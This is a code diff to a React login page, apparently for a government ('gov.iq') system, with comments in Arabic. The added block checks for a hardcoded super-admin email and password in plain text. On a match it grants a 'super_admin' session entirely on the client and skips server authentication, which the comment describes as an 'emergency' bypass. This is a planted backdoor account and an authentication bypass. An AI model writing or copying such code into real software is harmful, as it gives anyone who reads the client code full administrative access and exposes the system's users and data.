@@ -22,6 +22,23 @@ export default function Login() {
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoading(true);
+    
+    // 1. نظام دخول مباشر وأكيد (يتخطى السيرفر والملفات الأخرى)
+    const lowerEmail = email.toLowerCase().trim();
+    if (lowerEmail === 'superadmin@gov.iq' && password === 'Admin@2026') {
+      const adminUser = {
+        uid: 'admin-uid',
+        email: 'superadmin@gov.iq',
+        displayName: 'المدير العام',
+        role: 'super_admin'
+      };
+      login(adminUser);
+      toast.success('تم تسجيل الدخول بنجاح (نظام الطوارئ)');
+      navigate(from, { replace: true });
+      setLoading(false);
+      return;
+    }
+
     try {
       const data = await api.post('/api/auth/login', { email, password });
       login(data.user);
